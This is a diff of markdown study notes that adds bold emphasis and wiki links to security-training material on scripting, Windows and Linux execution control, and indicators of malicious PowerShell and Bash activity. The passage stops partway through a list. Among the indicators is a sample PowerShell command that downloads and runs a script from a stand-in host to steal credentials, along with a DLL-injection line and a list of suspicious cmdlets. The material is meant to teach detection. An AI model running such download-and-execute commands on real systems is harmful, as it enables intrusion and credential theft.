@@ -30,7 +30,7 @@ Python is a popular language for implementing all kinds of development projects,
 
 ### Variables
 
-Python uses the = operator to assign a value to a variable. Variables are not declared with a data type, such as string or integer, but Python is strongly typed, meaning that you cannot add an integer variable to a string variable, for instance. String literals can be delimited using single or double quotes.
+Python uses the **= operator to assign a value to a variable**. Variables are not declared with a data type, such as string or integer, but Python is strongly typed, meaning that you cannot add an integer variable to a string variable, for instance. String literals can be delimited using single or double quotes.
 
 ### Functions
 
@@ -102,22 +102,22 @@ Python uses _only if_ for branching logic, though complex nested conditions can 
 
 ### Modules
 
-A Python module is a library of functions for accomplishing standard tasks, such as opening a network socket or interacting with an operating system's API. One of the perceived strengths of Python is the huge number of modules. For example, the os module contains functions to interact with the operating system, while the socket module handles network connections and the url module opens and parses resource addresses. Various extension modules allow a Python script to interact with Windows APIs.
+A **Python module is a library of functions** for accomplishing standard tasks, such as opening a network socket or interacting with an operating system's API. One of the perceived strengths of Python is the huge number of modules. For example, the os module contains functions to interact with the operating system, while the socket module handles network connections and the url module opens and parses resource addresses. Various extension modules allow a Python script to interact with Windows APIs.
 
 The presence of two malicious libraries within a Python repository illustrates the potential risks of third-party code ([https://www.zdnet.com/article/two-malicious-python-libraries-removed-from-pypi/](https://www.zdnet.com/article/two-malicious-python-libraries-removed-from-pypi/)).
 
 ### Execution
 
-Python is an interpreted language, executed within the context of a binary Python process. In Windows, a Python script (.py) can be called via python.exe (with a command window) or pythonw.exe (with no command window). A Python script can also be compiled to a standalone Windows executable using the py2exe extension. This executable can be digitally signed.
+Python is an interpreted language, executed within the context of a binary Python process. In Windows, a Python script (.py) can be called via **python.exe (with a command window) or pythonw.exe (with no command window).** A Python script can also be compiled to a standalone **Windows executable using the py2exe** extension. This executable can be digitally signed.
 # POWERSHELL SCRIPT ENVIRONMENT
 
-PowerShell is the preferred method of performing Windows administration tasks ([docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7](https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7)). It has also become the Windows hacker's go-to toolkit. PowerShell statements can be executed at a PowerShell prompt, or run as a script (.ps1) on any PowerShell-enabled host.
+PowerShell is the preferred method of performing Windows administration tasks ([docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7](https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7)). It has also become the Windows hacker's go-to toolkit. PowerShell statements can be executed at a PowerShell prompt, or run as a **script (.ps1)** on any PowerShell-enabled host.
 
 The Get-Help cmdlet shows help on different elements of the PowerShell environment. PowerShell is case-insensitive.
 
 ### Cmdlets and Functions
 
-Most PowerShell usage is founded on cmdlets. A cmdlet is a compiled library that exposes some configuration or administrative task, such as starting a VM in Hyper-V. Cmdlets use a Verb-Noun naming convention. Cmdlets always return an object. Typically, the return from a cmdlet will be piped to some other cmdlet or function. For example:
+Most PowerShell usage is founded on cmdlets. A [[cmdlet]] is a compiled library that exposes some configuration or administrative task, such as starting a VM in Hyper-V. Cmdlets use a Verb-Noun naming convention. **Cmdlets always return an object**. Typically, the return from a cmdlet will be **piped** to some other cmdlet or function. For example:
 
 Get-Process | Where { $_.name -eq 'nmap' } | Format-List
 
@@ -137,11 +137,11 @@ $greeting = 'Hello ' + $(Cat-Name('World',''))
 
 Write-Host $greeting
 
-Note that a variable is declared by prefixing a label with $. 
+**Note that a variable is declared by prefixing a label with $.** 
 
 ### Logic and Looping Statements
 
-PowerShell supports a wider range of branching and looping structures than Python, including the switch and do statements. Curly brackets are used to structure the statements. PowerShell uses textual operators (-eq, -ne, -lt, -gt, -le, and -ge).
+PowerShell supports a wider range of branching and looping structures than Python, including the switch and do statements. Curly brackets are used to structure the statements. **PowerShell uses textual operators (-eq, -ne, -lt, -gt, -le, and -ge).**
 
 ### Modules
 
@@ -156,63 +156,63 @@ Execution control is the process of determining what additional software or scri
 
 Execution control can be implemented as either an allow list or a block list.
 
--   Allow list is a highly restrictive policy that means only running authorized processes and scripts. Allowing only specific applications that have been added to a list will inevitably hamper users at some point and increase support time and costs. For example, a user might need to install a conferencing application at short notice.
--   Block list is a permissive policy that only prevents execution of listed processes and scripts. It is vulnerable to software that has not previously been identified as malicious (or capable of or vulnerable to malicious use).
+-   **Allow list is a highly restrictive policy that means only running authorized processes and scripts.** Allowing only specific applications that have been added to a list will inevitably hamper users at some point and increase support time and costs. For example, a user might need to install a conferencing application at short notice.
+-   **Block list is a permissive policy** that only prevents execution of listed processes and scripts. It is vulnerable to software that has not previously been identified as malicious (or capable of or vulnerable to malicious use).
 
 These concepts can also be referred to as whitelists and blacklists, but most sources now deprecate this terminology.
 
 ### Code Signing
 
-Code signing is the principal means of proving the authenticity and integrity of code (an executable or a script). The developer creates a cryptographic hash of the file then signs the hash using his or her private key. The program is shipped with a copy of the developer's code signing certificate, which contains a public key that the destination computer uses to read and verify the signature. The OS then prompts the user to choose whether to accept the signature and run the program.
+Code signing is the principal means of proving the authenticity and integrity of code (an executable or a script). T**he developer creates a cryptographic hash of the file then signs the hash using his or her private key.** The program is shipped with a copy of the developer's code signing certificate, which contains a public key that the destination computer uses to read and verify the signature. The OS then prompts the user to choose whether to accept the signature and run the program.
 
 ### OS-Based Execution Control
 
 Execution control is often enforced using a third-party security product, but there are some built-in Windows features that can perform the task:
 
--   Software Restriction Policies (SRP)—available for most versions and editions of Windows, SRP can be configured as group policy objects (GPOs) to passlist file system locations from which executables and scripts can launch. Rules can also be configured by publisher signature or by file hash. There is also support for creating blocklist-based rules.
+-   **Software Restriction Policies** ([[SRP]])—available for most versions and editions of Windows, SRP can be configured as group policy objects ([[GPOs]]) to passlist file system locations from which executables and scripts can launch. Rules can also be configured by publisher signature or by file hash. There is also support for creating blocklist-based rules.
 -   AppLocker—improves configuration options and default usage of SRP. Notably AppLocker policies can be applied to user and group accounts rather than just computer accounts. However, AppLocker GPOs can only be configured for Enterprise and Ultimate editions of Windows 7 and later.
--   Windows Defender Application Control (WDAC)—formerly Device Guard, this can be used to create Code Integrity (CI) policies, which can be used on their own or in conjunction with AppLocker. CI policies apply to the computer and affect all users. CI policies can be based on version-aware and publisher digital signatures, as well as image hashes and/or file paths. WDAC is a useful option for preventing administrator accounts from disabling execution control options ([docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control)). WDAC is principally configured using XML policy statements and PowerShell.
+-   Windows Defender Application Control ([[WDAC]])—formerly Device Guard, this can be used to create Code Integrity ([[CI]]) policies, which can be used on their own or in conjunction with AppLocker. CI policies apply to the computer and affect all users. CI policies can be based on version-aware and publisher digital signatures, as well as image hashes and/or file paths. WDAC is a useful option for preventing administrator accounts from disabling execution control options ([docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control)). WDAC is principally configured using XML policy statements and PowerShell.
 
 In Windows, execution of PowerShell scripts can be inhibited by the execution policy. Note that the execution policy is not an access control mechanism. It can be bypassed in any number of different ways. WDAC is a robust mechanism for restricting use of potentially dangerous code, such as malicious PowerShell.
 
-In Linux, execution control is normally enforced by using a mandatory access control (MAC) kernel module or Linux Security Module (LSM). The two main LSMs are SELinux ([access.redhat.com/documentation/en-us/red_hat_enterprise_linux/5/html/deployment_guide/ch-selinux](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/5/html/deployment_guide/ch-selinux)) and AppArmor ([wiki.ubuntu.com/AppArmor](https://wiki.ubuntu.com/AppArmor)).
+In Linux, execution control is normally enforced by using a mandatory access control ([[MAC]]) kernel module or Linux Security Module ([[LSM]]). The two main LSMs are SELinux ([access.redhat.com/documentation/en-us/red_hat_enterprise_linux/5/html/deployment_guide/ch-selinux](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/5/html/deployment_guide/ch-selinux)) and AppArmor ([wiki.ubuntu.com/AppArmor](https://wiki.ubuntu.com/AppArmor)).
 # MALICIOUS CODE INDICATORS
 
-As with buffer overflow, indicators of malicious code execution are either caught by endpoint protection software or discovered after the fact in logs of how the malware interacted with the network, file system, and registry. If you are performing threat hunting or observing malware in a sandbox, it is helpful to consider the main types of malicious activity:
+As with **buffer overflow, indicators of malicious code execution are either caught by endpoint protection software or discovered after the fact in logs of how the malware interacted with the network, file system, and registry**. If you are performing threat hunting or observing malware in a sandbox, it is helpful to consider the main types of **malicious activity**:
 
--   Shellcode—this is a minimal program designed to exploit a buffer overflow or similar vulnerability to gain privileges, or to drop a backdoor on the host if run as a Trojan ([attack.mitre.org/tactics/TA0002](https://attack.mitre.org/tactics/TA0002/)). Having gained a foothold, this type of attack will be followed by some type of network connection to download additional tools.
--   Credential dumping—the malware might try to access the credentials file (SAM on a local Windows workstation) or sniff credentials held in memory by the lsass.exe system process ([attack.mitre.org/tactics/TA0006](https://attack.mitre.org/tactics/TA0006/)).
--   Lateral movement/insider attack—the general procedure is to use the foothold to execute a process remotely, using a tool such as psexec ([docs.microsoft.com/en-us/sysinternals/downloads/psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)) or PowerShell ([attack.mitre.org/tactics/TA0008](https://attack.mitre.org/tactics/TA0008/)). The attacker might be seeking data assets or may try to widen access by changing the system security configuration, such as opening a firewall port or creating an account. If the attacker has compromised an account, these commands can blend in with ordinary network operations, though they could be anomalous behavior for that account.
--   Persistence—this is a mechanism that allows the threat actor's backdoor to restart if the host reboots or the user logs off ([attack.mitre.org/tactics/TA0003](https://attack.mitre.org/tactics/TA0003/)). Typical methods are to use AutoRun keys in the registry, adding a scheduled task, or using Windows Management Instrumentation (WMI) event subscriptions.
+-   **Shellcode**—this is a minimal program designed to exploit a buffer overflow or similar vulnerability to gain privileges, or to drop a backdoor on the host if run as a Trojan ([attack.mitre.org/tactics/TA0002](https://attack.mitre.org/tactics/TA0002/)). Having gained a foothold, this type of attack will be followed by some type of network connection to download additional tools.
+-   **Credential dumping**—the malware might try to access the credentials file (SAM on a local Windows workstation) or sniff credentials held in memory by the lsass.exe system process ([attack.mitre.org/tactics/TA0006](https://attack.mitre.org/tactics/TA0006/)).
+-   **Lateral movement/insider attack**—the general procedure is to use the foothold to execute a process remotely, using a tool such as psexec ([docs.microsoft.com/en-us/sysinternals/downloads/psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)) or PowerShell ([attack.mitre.org/tactics/TA0008](https://attack.mitre.org/tactics/TA0008/)). The attacker might be seeking data assets or may try to widen access by changing the system security configuration, such as opening a firewall port or creating an account. If the attacker has compromised an account, these commands can blend in with ordinary network operations, though they could be anomalous behavior for that account.
+-   **Persistence**—this is a mechanism that allows the threat actor's backdoor to restart if the host reboots or the user logs off ([attack.mitre.org/tactics/TA0003](https://attack.mitre.org/tactics/TA0003/)). Typical methods are to use AutoRun keys in the registry, adding a scheduled task, or using Windows Management Instrumentation (WMI) event subscriptions.
 # POWERSHELL MALICIOUS INDICATORS
 
-There are numerous exploit frameworks to leverage PowerShell functionality, such as PowerShell Empire, PowerSploit, Metasploit, and Mimikatz. Some suspicious indicators for PowerShell execution include the following:
+There are numerous exploit frameworks to leverage PowerShell functionality, such as PowerShell Empire, PowerSploit, Metasploit, and Mimikatz. **Some suspicious indicators** for PowerShell execution include the following:
 
--   Cmdlets such as Invoke-Expression, Invoke-Command, Invoke-WMIMethod, New-Service, Create-Thread, Start-Process, and New-Object can indicate an attempt to run some type of binary shellcode. This is particularly suspicious if combined with a DownloadString or DownloadFile argument. One complication is that cmdlets can be shortened, assisting obfuscation. For example, Invoke-Expression can be run using IEX.
+-   **Cmdlets** such as Invoke-Expression, Invoke-Command, Invoke-WMIMethod, New-Service, Create-Thread, Start-Process, and New-Object can indicate an attempt to run some type of binary shellcode. This is particularly suspicious if combined with a DownloadString or DownloadFile argument. One complication is that cmdlets can be shortened, assisting obfuscation. For example, Invoke-Expression can be run using IEX.
 
 powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://badsite.foo/DoEvil.ps1'); Do-Evil -StealCreds"
 
--   Bypassing execution policy can also act as an indicator. The PowerShell code may be called as a Base64 encoded string (-enc argument) or may use the -noprofile or -ExecutionPolicy Bypass arguments.
--   Using system calls to the Windows API might indicate an attempt to inject a DLL or perform process hollowing, where the malicious code takes over a legitimate process:
+-   **Bypassing execution** policy can also act as an indicator. The PowerShell code may be called as a Base64 encoded string (-enc argument) or may use the -noprofile or -ExecutionPolicy Bypass arguments.
+-   **Using system calls** to the Windows API might indicate an attempt to inject a DLL or perform process hollowing, where the malicious code takes over a legitimate process:
 
 [Kernel32]::LoadLibrary("C:\Users\Foo\AppData\Local\Temp\doevil.dll")
 
--   Using another type of script to execute the PowerShell is also suspicious. For example, the attacker might use JavaScript code embedded in a PDF to launch PowerShell via a vulnerable reader app.
+-   **Using another type of script** to execute the PowerShell is also suspicious. For example, the attacker might use JavaScript code embedded in a PDF to launch PowerShell via a vulnerable reader app.
 
-The big problem with PowerShell indicators is distinguishing them from legitimate behavior. The following techniques can be used to assist with this:
+The big problem with PowerShell indicators is distinguishing them from legitimate behavior. The following [[techniques]] can be used to assist with this:
 
--   Use group policy to restrict execution of PowerShell to trusted accounts and hosts.
--   Use group policy execution control to run scripts only from trusted locations.
+-   Use **group policy to restrict** execution of PowerShell to trusted accounts and hosts.
+-   Use **group policy execution** control to run scripts only from trusted locations.
 -   Consider use of Constrained Language Mode ([devblogs.microsoft.com/powershell/powershell-constrained-language-mode](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)) and signed scripts to limit the ability of exploit code to run on high-value target systems.
--   Use PowerShell logging ([docs.microsoft.com/en-us/powershell/scripting/windows-powershell/wmf/whats-new/script-logging?view=powershell-7](https://docs.microsoft.com/en-us/powershell/scripting/windows-powershell/wmf/whats-new/script-logging?view=powershell-7)) and the Antimalware Scan Interface ([docs.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps](https://docs.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps)) to detect and prevent obfuscated and suspicious code.
--   Prevent the use of old PowerShell versions to mitigate the use of a downgrade attack to bypass access controls.
+-   Use **PowerShell logging** ([docs.microsoft.com/en-us/powershell/scripting/windows-powershell/wmf/whats-new/script-logging?view=powershell-7](https://docs.microsoft.com/en-us/powershell/scripting/windows-powershell/wmf/whats-new/script-logging?view=powershell-7)) and the Antimalware Scan Interface ([docs.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps](https://docs.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps)) to detect and prevent obfuscated and suspicious code.
+-   Prevent the use of **old PowerShell** versions to mitigate the use of a downgrade attack to bypass access controls.
 
 Symantec's white paper contains a useful introduction to PowerShell exploits ([docs.broadcom.com/doc/increased-use-of-powershell-in-attacks-16-en](https://docs.broadcom.com/doc/increased-use-of-powershell-in-attacks-16-en)).
 # BASH AND PYTHON MALICIOUS INDICATORS
 
-Most of the web runs on Linux, and Linux has proven remarkably resilient to attacks (meaning that it is able to withstand or recover quickly from difficult situations), given the high-value of the assets that depend on it. Most exploits of Linux systems depend on weak configuration, and/or vulnerabilities in web applications. In Linux, the command line is usually Bourne Again Shell (Bash). Many Linux systems have Python enabled as well. Python scripts or batch files of bash commands can be used for automation tasks, such as backup, or for malicious purposes.
+Most of the web runs on Linux, and Linux has proven remarkably resilient to attacks (meaning that it is able to withstand or recover quickly from difficult situations), given the high-value of the assets that depend on it. Most exploits of Linux systems depend on weak configuration, and/or vulnerabilities in web applications. In Linux, the command line is usually Bourne Again Shell ([[Bash]]). Many Linux systems have Python enabled as well. Python scripts or batch files of bash commands can be used for automation tasks, such as backup, or for malicious purposes.
 
-A malicious script running on a Linux host might attempt the following:
+A [[malicious script]] running on a Linux host might attempt the following:
 
 1.  Use commands such as whoami and ifconfig/ip/route to establish the local context.
 2.  Download tools, possibly using wget or curl.
